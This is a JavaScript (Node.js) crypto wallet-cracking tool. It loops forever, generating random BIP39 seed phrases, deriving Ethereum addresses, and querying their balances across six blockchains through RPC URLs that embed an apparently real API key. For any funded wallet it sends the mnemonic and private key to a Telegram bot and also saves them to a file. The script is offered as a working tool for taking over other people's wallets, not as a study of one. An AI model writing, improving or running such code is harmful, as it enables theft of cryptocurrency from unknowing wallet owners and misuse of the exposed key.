const ethers = require("ethers");
const Web3 = require("web3");
const bip39 = require("bip39");
const fs = require('fs');
const axios = require('axios');
const crypto = require('crypto');

const providers = {
    ETH: 'wss://rpc.merkle.io/1/sk_mbs_86be78c4551ed30cf2d6898026ec62af',
    BSC: 'wss://rpc.merkle.io/56/sk_mbs_86be78c4551ed30cf2d6898026ec62af',
    Polygon: 'wss://rpc.merkle.io/137/sk_mbs_86be78c4551ed30cf2d6898026ec62af',
    Optimism: 'wss://rpc.merkle.io/10/sk_mbs_86be78c4551ed30cf2d6898026ec62af',
    Arbitrum: 'wss://rpc.merkle.io/42161/sk_mbs_86be78c4551ed30cf2d6898026ec62af',
    Base: 'wss://rpc.merkle.io/8453/sk_mbs_86be78c4551ed30cf2d6898026ec62af'
};

const web3Instances = {};
for (const [name, url] of Object.entries(providers)) {
    web3Instances[name] = new Web3(new Web3.providers.WebsocketProvider(url));
}

let hit = 0;
let addressCounter = 0; 
let totalCount = 0;
let totalUSD = 0;
let titleContent = '';
const processedMnemonics = new Set(); 

const mnemonicsFile = 'processed_mnemonics.txt';

function loadProcessedMnemonics() {
    try {
        const data = fs.readFileSync(mnemonicsFile, 'utf8');
        data.split('\n').forEach(mnemonic => {
            if (mnemonic) {
                processedMnemonics.add(mnemonic);
            }
        });
        console.log("Loaded processed mnemonics.");
    } catch (error) {
        console.error("Could not load processed mnemonics:", error.message);
    }
}

function saveProcessedMnemonic(mnemonic) {
    try {
        fs.appendFileSync(mnemonicsFile, mnemonic + '\n', 'utf8');
    } catch (error) {
        console.error("Could not save mnemonic:", error.message);
    }
}

function loadCounter() {
    try {
        const data = fs.readFileSync('counter.txt', 'utf8');
        addressCounter = parseInt(data, 10);
    } catch (error) {
        console.error("Could not load counter:", error.message);
    }
}

function saveCounter() {
    try {
        fs.writeFileSync('counter.txt', addressCounter.toString(), 'utf8');
    } catch (error) {
        console.error("Could not save counter:", error.message);
    }
}

async function sendMessageToTelegram(message) {
    try {
        const botToken = '.....';
        const chatId = '........';
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        await axios.post(url, {
            chat_id: chatId,
            text: message
        });
        console.log("Message sent to Telegram.");
    } catch (error) {
        console.error("Error sending message to Telegram:", error.message);
    }
}

async function updateTitle() {
    titleContent = `Count: ${addressCounter}`;
    process.stdout.write(`\x1b]0;${titleContent}\x07`); 
}

async function solve(address, mnemonic, privateKey) {
    for (const [network, web3] of Object.entries(web3Instances)) {
        try {
            const [balanceWei] = await Promise.all([
                web3.eth.getBalance(address)
            ]);

            const balanceEth = web3.utils.fromWei(balanceWei, 'ether');

            if (parseFloat(balanceEth) > 0) {
                hit++;
                const ethPriceInUSD = balanceEth;
                if (ethPriceInUSD) {
                    totalCount++;

                    // Send message to Telegram
                    const message = `Balance found on ${network}!\nMnemonic: ${mnemonic}\nPrivate Key: ${privateKey}\nAddress: ${address}\nBalance: ${balanceEth}\n}`;
                    await sendMessageToTelegram(message);

                    const content = `Balance Network: ${network}\nMnemonic: ${mnemonic}\nPrivate Key: ${privateKey}\nAddress: ${address}\nBalance: ${balanceEth}\n`;
                    fs.appendFile('FoundMultiDino2024.txt', content, err => {
                        if (err) {
                            console.error(err);
                            process.exit(1); // Exit on error
                        }
                    });
                }
            }

            console.log(`Address #${++addressCounter}`);
            console.log(`Mnemonic: ${mnemonic}`);
            console.log(`Private Key: ${privateKey}`);
            console.log(`Address ETH: ${address}`);
            console.log(`Network: ${network}`);
            console.log(`Hit: ${hit}`);

            saveCounter();
            await updateTitle();
        } catch (error) {
            console.error(`Error in solve function for ${network}: ${error.message}`);
            process.exit(1); 
        }
    }
}

const words = fs.readFileSync("bip39.txt", { encoding: 'utf8', flag: 'r' })
    .replace(/(\r)/gm, "").toLowerCase().split("\n");

function rollDice() {
    let result = '';
    for (let i = 0; i < 5; i++) {
        result += Math.floor(Math.random() * 6) + 1;
    }
    return result;
}

function diceRollToIndex(roll) {
    return parseInt(roll, 6); 
}

function gen12() {
    let mnemonic = [];
    for (let i = 0; i < 12; i++) {
        const roll = rollDice();
        const index = diceRollToIndex(roll);
        const word = words[index % words.length];
        if (word) {
            mnemonic.push(word);
        } else {
            mnemonic.push('default');
        }
    }
    return mnemonic.join(' ');
}

async function main() {
    loadCounter();
    loadProcessedMnemonics();
    while (true) {
        await updateTitle();

        let mnemonic;
        let validMnemonic = false;
        while (!validMnemonic) {
            mnemonic = gen12();
            if (processedMnemonics.has(mnemonic)) {
                continue; 
            }
            validMnemonic = bip39.validateMnemonic(mnemonic);
        }

        processedMnemonics.add(mnemonic); 
        saveProcessedMnemonic(mnemonic);

        const paths = ["m/44'/60'/0'/0/0"];

        for (const path of paths) {
            let success = false;
            while (!success) {
                try {
                    const wallet = ethers.Wallet.fromMnemonic(mnemonic, path);
                    const address = wallet.address;
                    const privateKey = wallet.privateKey;
                    solve(address, mnemonic, privateKey);
                    await new Promise(r => setTimeout(r, 0));
                    success = true;
                } catch (error) {
                    console.error(error);
                    process.exit(1);
                }
            }
        }
    }
}

(async () => {
    while (true) {
        try {
            await main();
        } catch (error) {
            console.error("Error:", error.message);
            process.exit(1);
        }
    }
})();
